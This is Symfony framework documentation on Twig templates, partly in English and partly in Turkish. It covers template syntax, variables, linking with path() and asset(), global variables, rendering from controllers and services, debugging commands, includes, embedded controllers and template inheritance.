# Creating and Using Templates

[Edit this page](https://github.com/symfony/symfony-docs/edit/7.3/templates.rst)A template is the best way to organize and render HTML from inside your application, whether you need to render HTML from a [controller](https://symfony.com/doc/current/controller.html) or generate the [contents of an email](https://symfony.com/doc/current/mailer.html). Templates in Symfony are created with Twig: a flexible, fast, and secure template engine.

## [Installation](https://symfony.com/doc/current/templates.html#installation "Permalink to this headline")

In applications using [Symfony Flex](https://symfony.com/doc/current/setup.html#symfony-flex), run the following command to install both Twig language support and its integration with Symfony applications:

Copy

```
composer require symfony/twig-bundle
```

## [Twig Templating Language](https://symfony.com/doc/current/templates.html#twig-templating-language "Permalink to this headline")

The [Twig](https://twig.symfony.com/) templating language allows you to write concise, readable templates that are more friendly to web designers and, in several ways, more powerful than PHP templates. Take a look at the following Twig template example. Even if it's the first time you see Twig, you probably understand most of it:

```
<!DOCTYPE html>
<html>
    <head>
        <title>Welcome to Symfony!</title>
    </head>
    <body>
        <h1>{{ page_title }}</h1>

        {% if user.isLoggedIn %}
            Hello {{ user.name }}!
        {% endif %}

        {# ... #}
    </body>
</html>
```

Twig syntax is based on these three constructs:

* `{{ ... }}`, used to display the content of a variable or the result of evaluating an expression;
* `{% ... %}`, used to run some logic, such as a conditional or a loop;
* `{# ... #}`, used to add comments to the template (unlike HTML comments, these comments are not included in the rendered page).

You can't run PHP code inside Twig templates, but Twig provides utilities to run some logic in the templates. For example, **filters** modify content before being rendered, like the `upper` filter to uppercase contents:

```
{{ title|upper }}
```

Twig comes with a long list of [tags](https://twig.symfony.com/doc/3.x/tags/index.html), [filters](https://twig.symfony.com/doc/3.x/filters/index.html) and [functions](https://twig.symfony.com/doc/3.x/functions/index.html) that are available by default. In Symfony applications you can also use these [Twig filters and functions defined by Symfony](https://symfony.com/doc/current/reference/twig_reference.html) and you can [create your own Twig filters and functions](https://symfony.com/doc/current/templates.html#templates-twig-extension).

Twig is fast in the `prod` [environment](https://symfony.com/doc/current/configuration.html#configuration-environments) (because templates are compiled into PHP and cached automatically), but convenient to use in the `dev` environment (because templates are recompiled automatically when you change them).

### [Twig Configuration](https://symfony.com/doc/current/templates.html#twig-configuration "Permalink to this headline")

Twig has several configuration options to define things like the format used to display numbers and dates, the template caching, etc. Read the [Twig configuration reference](https://symfony.com/doc/current/reference/configuration/twig.html) to learn about them.

## [Creating Templates](https://symfony.com/doc/current/templates.html#creating-templates "Permalink to this headline")

Before explaining in detail how to create and render templates, look at the following example for a quick overview of the whole process. First, you need to create a new file in the `templates/` directory to store the template contents:

```
{# templates/user/notifications.html.twig #}
<h1>Hello {{ user_first_name }}!</h1>
<p>You have {{ notifications|length }} new notifications.</p>
```

Then, create a [controller](https://symfony.com/doc/current/controller.html) that renders this template and passes to it the needed variables:

```
// src/Controller/UserController.php
namespace App\Controller;

use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Response;

class UserController extends AbstractController
{
    // ...

    public function notifications(): Response
    {
        // get the user information and notifications somehow
        $userFirstName = '...';
        $userNotifications = ['...', '...'];

        // the template path is the relative file path from `templates/`
        return $this->render('user/notifications.html.twig', [
            // this array defines the variables passed to the template,
            // where the key is the variable name and the value is the variable value
            // (Twig recommends using snake_case variable names: 'foo_bar' instead of 'fooBar')
            'user_first_name' => $userFirstName,
            'notifications' => $userNotifications,
        ]);
    }
}
```

### [Template Naming](https://symfony.com/doc/current/templates.html#template-naming "Permalink to this headline")

Symfony recommends the following for template names:

* Use [snake case](https://en.wikipedia.org/wiki/Snake_case) for filenames and directories (e.g. `blog_posts.html.twig`, `admin/default_theme/blog/index.html.twig`, etc.);
* Define two extensions for filenames (e.g. `index.html.twig` or `blog_posts.xml.twig`) being the first extension (`html`, `xml`, etc.) the final format that the template will generate.

Although templates usually generate HTML contents, they can generate any text-based format. That's why the two-extension convention simplifies the way templates are created and rendered for multiple formats.

### [Template Location](https://symfony.com/doc/current/templates.html#template-location "Permalink to this headline")

Templates are stored by default in the `templates/` directory. When a service or controller renders the `product/index.html.twig` template, they are actually referring to the `<your-project>/templates/product/index.html.twig` file.

The default templates directory is configurable with the [twig.default_path](https://symfony.com/doc/current/reference/configuration/twig.html#config-twig-default-path) option and you can add more template directories [as explained later](https://symfony.com/doc/current/templates.html#templates-namespaces) in this article.

### [Template Variables](https://symfony.com/doc/current/templates.html#template-variables "Permalink to this headline")

A common need for templates is to print the values stored in the templates passed from the controller or service. Variables usually store objects and arrays instead of strings, numbers and boolean values. That's why Twig provides quick access to complex PHP variables. Consider the following template:

```
<p>{{ user.name }} added this comment on {{ comment.publishedAt|date }}</p>
```

The `user.name` notation means that you want to display some information (`name`) stored in a variable (`user`). Is `user` an array or an object? Is `name` a property or a method? In Twig this doesn't matter.

When using the `foo.bar` notation, Twig tries to get the value of the variable in the following order:

1. `$foo['bar']` (array and element);
2. `$foo->bar` (object and public property);
3. `$foo->bar()` (object and public method);
4. `$foo->getBar()` (object and *getter* method);
5. `$foo->isBar()` (object and *isser* method);
6. `$foo->hasBar()` (object and *hasser* method);
7. If none of the above exists, use `null` (or throw a `Twig\Error\RuntimeError` exception if the [strict_variables](https://symfony.com/doc/current/reference/configuration/twig.html#config-twig-strict-variables) option is enabled).

This allows to evolve your application code without having to change the template code (you can start with array variables for the application proof of concept, then move to objects with methods, etc.)


### Sayfalara Bağlantı Verme (Linking to Pages)

Bağlantı URL’lerini elle yazmak yerine, yönlendirme (routing) yapılandırmasına dayalı olarak URL’leri üretmek için `path()` fonksiyonunu kullanın.

İleride belirli bir sayfanın URL’sini değiştirmek isterseniz, yalnızca yönlendirme yapılandırmasını değiştirmeniz yeterlidir — şablonlar (templates) otomatik olarak yeni URL’yi oluşturur.

Aşağıdaki yönlendirme yapılandırmasını inceleyelim:

```php
// config/routes.php
use App\Controller\BlogController;
use Symfony\Component\Routing\Loader\Configurator\RoutingConfigurator;

return function (RoutingConfigurator $routes): void {
    $routes->add('blog_index', '/')
        ->controller([BlogController::class, 'index']);

    $routes->add('blog_post', '/articles/{slug}')
        ->controller([BlogController::class, 'show']);
};
```

Bu sayfalara Twig içinde bağlantı vermek için `path()` fonksiyonunu kullanabilirsiniz.

İlk argüman rota adıdır, ikinci argüman ise isteğe bağlı rota parametreleridir:

```twig
<a href="{{ path('blog_index') }}">Anasayfa</a>

{# ... #}

{% for post in blog_posts %}
    <h1>
        <a href="{{ path('blog_post', {slug: post.slug}) }}">{{ post.title }}</a>
    </h1>

    <p>{{ post.excerpt }}</p>
{% endfor %}
```

`path()` fonksiyonu **göreceli URL’ler** üretir.

Eğer **mutlak URL’ler** (örneğin e-posta veya RSS beslemeleri için) oluşturmanız gerekiyorsa, aynı argümanları alan `url()` fonksiyonunu kullanın:

```twig
<a href="{{ url('blog_index') }}">...</a>
```

---

### CSS, JavaScript ve Görsel (Image) Dosyalarına Bağlantı Verme

Bir şablonun statik bir kaynağa (örneğin bir görsele) bağlantı vermesi gerekiyorsa, Symfony bunu kolaylaştırmak için `asset()` Twig fonksiyonunu sunar.

Öncelikle asset paketini yükleyin:

```bash
composer require symfony/asset
```

Artık `asset()` fonksiyonunu kullanabilirsiniz:

```twig
{# Görsel "public/images/logo.png" dizininde #}
<img src="{{ asset('images/logo.png') }}" alt="Symfony!">

{# CSS dosyası "public/css/blog.css" dizininde #}
<link href="{{ asset('css/blog.css') }}" rel="stylesheet">

{# JS dosyası "public/bundles/acme/js/loader.js" dizininde #}
<script src="{{ asset('bundles/acme/js/loader.js') }}"></script>
```

#### `asset()` fonksiyonunu kullanmanızın avantajları:

* **Varlık (Asset) sürümlendirmesi:**

  `asset()` URL’lere sürüm numarası (veya hash) ekleyerek önbellek temizliği sağlar. Bu, hem **AssetMapper** hem de **Asset bileşeni** aracılığıyla çalışır.

  (Ayrıca `assets` yapılandırma seçeneklerine — örn. `version` ve `version_format` — bakabilirsiniz.)
* **Uygulama taşınabilirliği:**

  Uygulamanız kökte (`https://example.com`) veya bir alt dizinde (`https://example.com/my_app`) barınsın fark etmez; `asset()` otomatik olarak doğru yolu üretir

  (örneğin `/images/logo.png` veya `/my_app/images/logo.png`).

Mutlak URL’ler gerektiğinde `absolute_url()` fonksiyonunu kullanabilirsiniz:

```twig
<img src="{{ absolute_url(asset('images/logo.png')) }}" alt="Symfony!">
<link rel="shortcut icon" href="{{ absolute_url('favicon.png') }}">
```

---

### Gelişmiş Asset Yönetimi (Build, Versioning & More)

JavaScript ve CSS dosyalarınızı modern bir şekilde derlemek ve sürümlendirmek istiyorsanız, **Symfony AssetMapper** dokümantasyonuna göz atın.

---

### `app` Küresel (Global) Değişkeni

Symfony, her Twig şablonuna otomatik olarak **`app`** adlı bir bağlam nesnesi enjekte eder.

Bu değişken, uygulama hakkında çeşitli bilgilere erişim sağlar:

```twig
<p>Kullanıcı adı: {{ app.user.username ?? 'Anonim kullanıcı' }}</p>

{% if app.debug %}
    <p>İstek metodu: {{ app.request.method }}</p>
    <p>Uygulama ortamı: {{ app.environment }}</p>
{% endif %}
```

`app` değişkeni (`AppVariable` sınıfının bir örneği) şu bilgilere erişim sağlar:

| Özellik                               | Açıklama                                                                                             |
| -------------------------------------- | ------------------------------------------------------------------------------------------------------ |
| **app.user**                     | Geçerli kullanıcı nesnesi (kimlik doğrulaması yoksa `null`).                                    |
| **app.request**                  | Geçerli isteği temsil eden `Request`nesnesi.                                                       |
| **app.session**                  | Kullanıcının oturumunu temsil eden `Session`nesnesi (`null`olabilir).                           |
| **app.flashes**                  | Oturumdaki tüm flash mesajlarının dizisi. Belirli bir türü almak için `app.flashes('notice')`. |
| **app.environment**              | Geçerli yapılandırma ortamının adı (`dev`,`prod`vb.).                                        |
| **app.debug**                    | Uygulama debug modundaysa `true`, aksi halde `false`.                                              |
| **app.token**                    | Güvenlik belirtecini (`TokenInterface`) temsil eder.                                                |
| **app.current_route**            | Geçerli isteğe bağlı rotanın adı (`_route`).                                                   |
| **app.current_route_parameters** | Geçerli isteğin rota parametreleri (`_route_params`).                                              |
| **app.locale**                   | Geçerli yerel ayar (locale).                                                                          |
| **app.enabled_locales**          | Uygulamada etkin olan dillerin listesi.                                                                |

Ayrıca, Symfony’nin sağladığı bu küresel `app` değişkenine ek olarak,

tüm Twig şablonlarına otomatik olarak **kendi özel değişkenlerinizi** de enjekte edebilirsiniz — bu, bir sonraki bölümde açıklanmaktadır.


### Küresel (Global) Değişkenler

Twig, **tüm şablonlara otomatik olarak bir veya birden fazla değişken eklemenize** olanak tanır.

Bu küresel değişkenler, ana Twig yapılandırma dosyasındaki `twig.globals` seçeneği altında tanımlanır:

```php
// config/packages/twig.php
use Symfony\Config\TwigConfig;

return static function (TwigConfig $twig): void {
    // ...

    $twig->global('ga_tracking')->value('UA-xxxxx-x');
};
```

Artık `ga_tracking` değişkeni **tüm Twig şablonlarında** kullanılabilir; bu değişkeni şablona göndermek için denetleyiciden (controller) veya servisten ayrıca bir şey yapmanıza gerek yoktur:

```twig
<p>Google izleme kodu: {{ ga_tracking }}</p>
```

---

### Servisleri (Services) Küresel Twig Değişkeni Olarak Tanımlama

Statik değerlerin yanı sıra, Twig küresel değişkenleri **servisleri** de referans alabilir.

Ancak burada önemli bir nokta var: bu servisler **lazy-load (tembel yükleme)** değildir.

Yani Twig yüklendiği anda, bu servis **kullanılmasa bile** oluşturulur.

Bir servisi küresel Twig değişkeni olarak tanımlamak için, servis kimliğinin (`service ID`) başına `@` karakteri ekleyin — bu, servis parametrelerine başvururken kullanılan standart sözdizimidir:

```php
// config/packages/twig.php
use Symfony\Config\TwigConfig;
use function Symfony\Component\DependencyInjection\Loader\Configurator\service;

return static function (TwigConfig $twig): void {
    // ...

    $twig->global('uuid')->value(service('App\Generator\UuidGenerator'));
};
```

Artık Twig şablonlarınızda `uuid` değişkenini kullanarak **`UuidGenerator` servisine** erişebilirsiniz:

```twig
UUID: {{ uuid.generate }}
```

---

### Twig Bileşenleri (Twig Components)

 **Twig Bileşenleri** , her şablonun bir “bileşen sınıfı”na bağlandığı alternatif bir şablon render yöntemi sunar.

Bu yaklaşım, küçük şablon parçalarını (örneğin uyarı kutusu, modal penceresi, kategori kenar çubuğu gibi) oluşturmayı ve yeniden kullanmayı kolaylaştırır.

Ayrıntılı bilgi için şu belgeye bakabilirsiniz:

➡️ [UX Twig Component](https://symfony.com/doc/current/ux/twig-component.html)

Twig bileşenlerinin bir diğer “süper gücü”, **canlı (live) hale gelmeleridir** — yani kullanıcı etkileşime girdikçe Ajax üzerinden otomatik olarak güncellenebilirler.

Örneğin, kullanıcı bir arama kutusuna yazı girdiğinde, Twig bileşeni **Ajax aracılığıyla yeniden render edilerek** anlık sonuçlar gösterebilir!

Bu özelliği öğrenmek için şu belgeye bakabilirsiniz:

➡️ [UX Live Component](https://symfony.com/doc/current/ux/live-component.html)

---

### Şablonları Render Etme

#### Denetleyicilerde (Controllers) Şablon Render Etme

Eğer denetleyiciniz `AbstractController` sınıfından türetiliyorsa, **`render()` yardımcı metodunu** kullanabilirsiniz:

```php
// src/Controller/ProductController.php
namespace App\Controller;

use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Response;

class ProductController extends AbstractController
{
    public function index(): Response
    {
        // ...

        // `render()` metodu, şablonun ürettiği içeriği içeren bir `Response` nesnesi döndürür
        return $this->render('product/index.html.twig', [
            'category' => '...',
            'promotions' => ['...', '...'],
        ]);

        // `renderView()` metodu sadece şablonun ürettiği içeriği döndürür
        $contents = $this->renderView('product/index.html.twig', [
            'category' => '...',
            'promotions' => ['...', '...'],
        ]);

        return new Response($contents);
    }
}
```

Eğer denetleyiciniz  **`AbstractController` sınıfından türememişse** , Twig servisini manuel olarak almalı ve `render()` metodunu oradan kullanmalısınız.

---

#### `#[Template]` Özelliğini Kullanmak

Alternatif olarak, şablonu belirtmek için denetleyici metodunda **`#[Template]`** özniteliğini (attribute) kullanabilirsiniz:

```php
// src/Controller/ProductController.php
namespace App\Controller;

use Symfony\Bridge\Twig\Attribute\Template;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Response;

class ProductController extends AbstractController
{
    #[Template('product/index.html.twig')]
    public function index(): array
    {
        // ...

        // `#[Template]` kullanıldığında sadece şablona aktarılacak verileri döndürmeniz yeterlidir.
        // Response nesnesi otomatik olarak oluşturulur.
        return [
            'category' => '...',
            'promotions' => ['...', '...'],
        ];
    }
}
```

---

### Blokları Render Etmek (renderBlock ve renderBlockView)

`AbstractController` ayrıca **`renderBlock()`** ve **`renderBlockView()`** metotlarını da sağlar:

```php
// src/Controller/ProductController.php
namespace App\Controller;

use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Response;

class ProductController extends AbstractController
{
    // ...

    public function price(): Response
    {
        // ...

        // `renderBlock()` metodu, belirtilen blok içeriğini içeren bir `Response` nesnesi döndürür
        return $this->renderBlock('product/index.html.twig', 'price_block', [
            // ...
        ]);

        // `renderBlockView()` sadece blok içeriğini döndürür
        $contents = $this->renderBlockView('product/index.html.twig', 'price_block', [
            // ...
        ]);

        return new Response($contents);
    }
}
```

Bu yöntemler, özellikle **şablon kalıtımı (template inheritance)** veya **Turbo Streams** gibi senaryolarda kullanışlıdır.

---

#### `#[Template]` ile Belirli Bir Blok Render Etmek

Bir denetleyici metodunda belirli bir Twig bloğunu render etmek için `#[Template]` özniteliğini kullanabilirsiniz:

```php
// src/Controller/ProductController.php
namespace App\Controller;

use Symfony\Bridge\Twig\Attribute\Template;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Response;

class ProductController extends AbstractController
{
    #[Template('product.html.twig', block: 'price_block')]
    public function price(): array
    {
        return [
            // ...
        ];
    }
}
```

> 🆕 `#[Template]` özniteliğinin `block` argümanı **Symfony 7.2** sürümüyle birlikte tanıtılmıştır.
>
>
> ### Servislerde Şablon Render Etme (Rendering a Template in Services)
>
> Kendi servisleriniz içinde Twig şablonlarını render etmek için Symfony’nin **`twig` servisini** enjekte edebilirsiniz.
>
> Eğer **autowiring** (otomatik bağımlılık çözümü) kullanıyorsanız, tek yapmanız gereken servis yapıcısına (`__construct`) bir argüman eklemek ve onu **`Twig\Environment`** ile tür belirtmektir:
>
> ```php
> // src/Service/SomeService.php
> namespace App\Service;
>
> use Twig\Environment;
>
> class SomeService
> {
>     public function __construct(
>         private Environment $twig,
>     ) {
>     }
>
>     public function someMethod(): void
>     {
>         // ...
>
>         $htmlContents = $this->twig->render('product/index.html.twig', [
>             'category' => '...',
>             'promotions' => ['...', '...'],
>         ]);
>     }
> }
> ```
>
> ---
>
> ### E-postalarda Şablon Render Etme (Rendering a Template in Emails)
>
> Symfony, Twig ile entegre çalışan bir **mailer sistemi** sunar.
>
> Bu konuda detaylı bilgi için [Mailer ve Twig entegrasyonu](https://symfony.com/doc/current/mailer.html#twig-integration) dokümantasyonuna bakabilirsiniz.
>
> ---
>
> ### Bir Rotadan Doğrudan Şablon Render Etme
>
> Genellikle şablonlar **controller** veya **service** içinde render edilir.
>
> Ancak değişken gerektirmeyen **statik sayfalar** için, doğrudan rota tanımından şablon render edebilirsiniz.
>
> Bunun için Symfony’nin sunduğu özel **`TemplateController`** sınıfını kullanın:
>
> ```php
> // config/routes.php
> use Symfony\Bundle\FrameworkBundle\Controller\TemplateController;
> use Symfony\Component\Routing\Loader\Configurator\RoutingConfigurator;
>
> return function (RoutingConfigurator $routes): void {
>     $routes->add('acme_privacy', '/privacy')
>         ->controller(TemplateController::class)
>         ->defaults([
>             // render edilecek şablonun yolu
>             'template'  => 'static/privacy.html.twig',
>
>             // HTTP durum kodu (varsayılan: 200)
>             'statusCode' => 200,
>
>             // Symfony tarafından önbellekleme (cache) için özel seçenekler
>             'maxAge'    => 86400,
>             'sharedAge' => 86400,
>
>             // sadece istemci tarafı önbelleğe almanın etkinleştirilip etkinleştirilmeyeceği
>             'private' => true,
>
>             // şablona gönderilecek isteğe bağlı değişkenler
>             'context' => [
>                 'site_name' => 'ACME',
>                 'theme' => 'dark',
>             ],
>
>             // yanıta eklenecek isteğe bağlı HTTP başlıkları
>             'headers' => [
>                 'Content-Type' => 'text/html',
>             ]
>         ]);
> };
> ```
>
>> 🆕 **`headers`** seçeneği **Symfony 7.2** sürümüyle birlikte eklenmiştir.
>>
>
> ---
>
> ### Bir Şablonun Var Olup Olmadığını Kontrol Etme (Checking if a Template Exists)
>
> Twig, şablonları yüklemek için bir **template loader** kullanır.
>
> Bu loader ayrıca, bir şablonun var olup olmadığını kontrol etmeye yarayan bir `exists()` metoduna da sahiptir.
>
> ```php
> use Twig\Environment;
>
> class YourService
> {
>     public function __construct(Environment $twig)
>     {
>         $loader = $twig->getLoader();
>
>         if ($loader->exists('theme/layout_responsive.html.twig')) {
>             // şablon mevcut, bir işlem yapabilirsiniz
>         }
>     }
> }
> ```
>
> ---
>
> ### Şablonları Hata Ayıklama (Debugging Templates)
>
> Symfony, Twig şablonlarındaki hataları tespit etmek ve çözmek için çeşitli araçlar sunar.
>
> ---
>
> #### Twig Şablonlarını Lint’lemek (Linting Twig Templates)
>
> `lint:twig` komutu, Twig şablonlarınızda sözdizimi (syntax) hatası olup olmadığını kontrol eder.
>
> Üretim ortamına geçmeden önce (örneğin CI süreçlerinde) bu komutu çalıştırmanız önerilir:
>
> ```bash
> php bin/console lint:twig
> ```
>
> Belirli klasörler veya dosyalar için:
>
> ```bash
> php bin/console lint:twig templates/email/
> php bin/console lint:twig templates/article/recent_list.html.twig
> ```
>
> Deprecation uyarılarını göstermek için:
>
> ```bash
> php bin/console lint:twig --show-deprecations templates/email/
> ```
>
> Belirli dizinleri hariç tutmak için (Symfony 7.1+):
>
> ```bash
> php bin/console lint:twig templates/ --excludes=data_collector --excludes=dev_tool
> ```
>
>> ⚙️  **Symfony 7.3 öncesinde** , `--show-deprecations` seçeneği yalnızca **ilk** uyarıyı gösteriyordu.
>>
>> Şimdi tüm uyarıları tek çalıştırmada görebilirsiniz.
>>
>
> GitHub Actions içinde çalıştırıldığında çıktı biçimi otomatik olarak GitHub formatına uyarlanır.
>
> Bu formatı manuel olarak da belirtebilirsiniz:
>
> ```bash
> php bin/console lint:twig --format=github
> ```
>
> ---
>
> ### Twig Bilgilerini İncelemek (Inspecting Twig Information)
>
> `debug:twig` komutu, Twig ile ilgili mevcut tüm bilgileri listeler —
>
> örneğin **fonksiyonlar, filtreler, global değişkenler** ve yüklenen uzantılar.
>
> ```bash
> php bin/console debug:twig
> ```
>
> Filtreleme yapmak isterseniz:
>
> ```bash
> php bin/console debug:twig --filter=date
> ```
>
> Belirli bir Twig şablonunu analiz etmek için:
>
> ```bash
> php bin/console debug:twig @Twig/Exception/error.html.twig
> ```
>
> ---
>
> ### `dump()` Twig Yardımcı Fonksiyonları (Dump Twig Utilities)
>
> Symfony, PHP’nin `var_dump()` fonksiyonuna geliştirilmiş bir alternatif olarak `dump()` fonksiyonunu sunar.
>
> Bu, değişkenlerin içeriğini hızlıca incelemenizi sağlar — hem PHP tarafında hem Twig şablonlarında kullanılabilir.
>
> Öncelikle, uygulamanızda **VarDumper bileşeninin** yüklü olduğundan emin olun:
>
> ```bash
> composer require --dev symfony/debug-bundle
> ```
>
> Daha sonra ihtiyacınıza göre `{% dump %}` etiketi veya `{{ dump() }}` fonksiyonunu kullanabilirsiniz:
>
> ```twig
> {# templates/article/recent_list.html.twig #}
>
> {# Bu değişkenin içeriği sayfa yerine Web Debug Toolbar’a gönderilir #}
> {% dump articles %}
>
> {% for article in articles %}
>     {# Bu değişkenin içeriği doğrudan sayfa içinde gösterilir #}
>     {{ dump(article) }}
>
>     {# İsteğe bağlı olarak, etiketli dump kullanabilirsiniz #}
>     {{ dump(blog_posts: articles, user: app.user) }}
>
>     <a href="/article/{{ article.slug }}">
>         {{ article.title }}
>     </a>
> {% endfor %}
> ```
>
>> ⚠️ **Güvenlik Notu:**
>>
>> `dump()` fonksiyonu yalnızca **`dev`** ve **`test`** ortamlarında kullanılabilir.
>>
>> `prod` ortamında çalıştırmaya çalışırsanız bir PHP hatası alırsınız.
>>
>>
>> ### Şablon İçeriklerini Yeniden Kullanmak (Reusing Template Contents)
>>
>> ---
>>
>> ## 🔹 Şablonları Dahil Etmek (Including Templates)
>>
>> Birden fazla Twig şablonunda aynı kodu tekrar tekrar yazıyorsanız, bu kodu ayrı bir **“şablon parçası” (template fragment)** olarak ayırabilir ve diğer şablonlarda **include()** fonksiyonu ile kullanabilirsiniz.
>>
>> Örneğin, kullanıcı bilgilerini gösteren aşağıdaki kodun birçok yerde tekrarlandığını varsayalım:
>>
>> ```twig
>> {# templates/blog/index.html.twig #}
>> <div class="user-profile">
>>     <img src="{{ user.profileImageUrl }}" alt="{{ user.fullName }}">
>>     <p>{{ user.fullName }} - {{ user.email }}</p>
>> </div>
>> ```
>>
>> Bunu şu şekilde ayırabilirsiniz:
>>
>> 1. Yeni bir Twig şablonu oluşturun:
>>
>>    `templates/blog/_user_profile.html.twig`
>>
>>    (Alt çizgi `_` öneki isteğe bağlıdır ama genellikle **parça (fragment)** şablonlarını ayırmak için kullanılır.)
>> 2. Ana şablondan bu kodu kaldırın ve yerine şu satırı ekleyin:
>>
>> ```twig
>> {{ include('blog/_user_profile.html.twig') }}
>> ```
>>
>> `include()` fonksiyonu, dahil edilecek şablonun yolunu argüman olarak alır.
>>
>> Dahil edilen şablon, onu çağıran şablondaki tüm değişkenlere erişebilir.
>>
>> (Erişim davranışını kontrol etmek için `with_context` seçeneğini kullanabilirsiniz.)
>>
>> Ayrıca, dahil edilen şablona özel değişkenler gönderebilirsiniz.
>>
>> Örneğin, dahil edilecek şablon `user` değişkenini bekliyorsa ancak sizde veri `blog_post.author` içinde tutuluyorsa, şu şekilde yeniden adlandırabilirsiniz:
>>
>> ```twig
>> {{ include('blog/_user_profile.html.twig', { user: blog_post.author }) }}
>> ```
>>
>> ---
>>
>> ## 🔹 Controller’ları Gömme (Embedding Controllers)
>>
>> Şablon parçalarını dahil etmek tekrarı azaltmak için faydalıdır;
>>
>> ancak bazı durumlarda **veri sorgusu gerektiren dinamik içerikler** için uygun değildir.
>>
>> Örneğin, şablon parçası en son üç blog yazısını gösteriyorsa, her sayfada bu sorguyu tekrarlamanız gerekir.
>>
>> Bunun yerine, **controller çıktısını gömme (embedding)** yaklaşımını kullanabilirsiniz.
>>
>> ### 1. Controller oluşturun
>>
>> ```php
>> // src/Controller/BlogController.php
>> namespace App\Controller;
>>
>> use Symfony\Component\HttpFoundation\Response;
>> use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
>>
>> class BlogController extends AbstractController
>> {
>>     public function recentArticles(int $max = 3): Response
>>     {
>>         // veritabanından en son makaleleri alın
>>         $articles = ['...', '...', '...'];
>>
>>         return $this->render('blog/_recent_articles.html.twig', [
>>             'articles' => $articles
>>         ]);
>>     }
>> }
>> ```
>>
>> ### 2. Şablon parçası oluşturun
>>
>> ```twig
>> {# templates/blog/_recent_articles.html.twig #}
>> {% for article in articles %}
>>     <a href="{{ path('blog_show', {slug: article.slug}) }}">
>>         {{ article.title }}
>>     </a>
>> {% endfor %}
>> ```
>>
>> ### 3. Herhangi bir şablondan controller çıktısını gömün
>>
>> ```twig
>> {# templates/base.html.twig #}
>> <div id="sidebar">
>>     {# Eğer controller bir route’a bağlıysa #}
>>     {{ render(path('latest_articles', {max: 3})) }}
>>     {{ render(url('latest_articles', {max: 3})) }}
>>
>>     {# Controller’ı doğrudan tanımlayarak (route olmadan) #}
>>     {{ render(controller(
>>         'App\\Controller\\BlogController::recentArticles', {max: 3}
>>     )) }}
>> </div>
>> ```
>>
>>> `controller()` fonksiyonu kullanıldığında, bu controller’lar normal Symfony route’larıyla erişilmez; yalnızca **özel fragment URL’si** üzerinden çağrılır.
>>>
>>
>> Bunu yapılandırmak için:
>>
>> ```php
>> // config/packages/framework.php
>> use Symfony\Config\FrameworkConfig;
>>
>> return static function (FrameworkConfig $framework): void {
>>     $framework->fragments()->path('/_fragment');
>> };
>> ```
>>
>> ⚠️ Çok sayıda controller gömmek uygulamanın performansını olumsuz etkileyebilir.
>>
>> Bu nedenle **cache** (önbellekleme) kullanmanız önerilir.
>>
>> ---
>>
>> ## 🔹 hinclude.js ile Asenkron İçerik Gömme
>>
>> Twig, **hinclude.js** kütüphanesiyle asenkron içerik gömmeyi de destekler.
>>
>> Bu sayede sayfa yüklenirken içerik sonradan (Ajax ile) yüklenebilir.
>>
>> ### 1. hinclude.js’i dahil edin
>>
>> Sayfanıza kütüphaneyi ekleyin veya AssetMapper ile JavaScript dosyanıza import edin.
>>
>> ### 2. `render_hinclude()` fonksiyonunu kullanın
>>
>> ```twig
>> {{ render_hinclude(controller('...')) }}
>> {{ render_hinclude(url('...')) }}
>> ```
>>
>>> `controller()` fonksiyonunu kullanıyorsanız, yine `fragments.path` ayarını yapmanız gerekir.
>>>
>>
>> ### 3. Varsayılan içerik (JavaScript devre dışıysa)
>>
>> JavaScript devre dışıysa veya geç yükleniyorsa, yedek içerik gösterebilirsiniz:
>>
>> ```php
>> // config/packages/framework.php
>> use Symfony\Config\FrameworkConfig;
>>
>> return static function (FrameworkConfig $framework): void {
>>     $framework->fragments()
>>         ->hincludeDefaultTemplate('hinclude.html.twig');
>> };
>> ```
>>
>> Ayrıca render çağrısına özel varsayılan içerik de tanımlayabilirsiniz:
>>
>> ```twig
>> {{ render_hinclude(controller('...'), {default: 'default/content.html.twig'}) }}
>> {{ render_hinclude(controller('...'), {default: 'Yükleniyor...'}) }}
>> ```
>>
>> ### 4. hinclude.js seçeneklerini belirtmek için `attributes` kullanın
>>
>> ```twig
>> {# Çapraz site isteklerinde kimlik bilgilerini göndermek için #}
>> {{ render_hinclude(controller('...'), {attributes: {'data-with-credentials': 'true'}}) }}
>>
>> {# Yüklenen içeriğin içindeki JavaScript’in çalıştırılması için #}
>> {{ render_hinclude(controller('...'), {attributes: {evaljs: 'true'}}) }}
>> ```
>>
>> ---
>>
>> ## 🔹 Şablon Kalıtımı ve Düzenler (Template Inheritance and Layouts)
>>
>> Uygulamanız büyüdükçe, sayfalar arasında tekrarlanan alanlar (header, footer, sidebar vb.) artar.
>>
>> Bu gibi durumlarda **template inheritance** (şablon kalıtımı) kullanmak en iyi çözümdür.
>>
>> Twig kalıtım kavramı, PHP sınıf kalıtımına benzer.
>>
>> Bir **ebeveyn şablon** tanımlarsınız ve diğer şablonlar bu şablondan **extend** eder.
>>
>> ### Symfony için önerilen 3 katmanlı yapı:
>>
>> 1. **`templates/base.html.twig`**
>>
>>    Uygulamadaki tüm sayfaların ortak HTML yapısı (örnek: `<head>`, `<header>`, `<footer>`).
>> 2. **`templates/layout.html.twig`**
>>
>>    `base.html.twig`’den türeyen, sayfa düzenini belirleyen şablon (örneğin 2 sütunlu layout).
>> 3. **`templates/*.html.twig`**
>>
>>    Gerçek sayfa içeriklerini içeren, layout’tan türeyen sayfalar.
>>
>> ---
>>
>> ### 1️⃣ `base.html.twig`
>>
>> ```twig
>> {# templates/base.html.twig #}
>> <!DOCTYPE html>
>> <html>
>>     <head>
>>         <meta charset="UTF-8">
>>         <title>{% block title %}My Application{% endblock %}</title>
>>         {% block stylesheets %}
>>             <link rel="stylesheet" type="text/css" href="/css/base.css">
>>         {% endblock %}
>>     </head>
>>     <body>
>>         {% block body %}
>>             <div id="sidebar">
>>                 {% block sidebar %}
>>                     <ul>
>>                         <li><a href="{{ path('homepage') }}">Home</a></li>
>>                         <li><a href="{{ path('blog_index') }}">Blog</a></li>
>>                     </ul>
>>                 {% endblock %}
>>             </div>
>>
>>             <div id="content">
>>                 {% block content %}{% endblock %}
>>             </div>
>>         {% endblock %}
>>     </body>
>> </html>
>> ```
>>
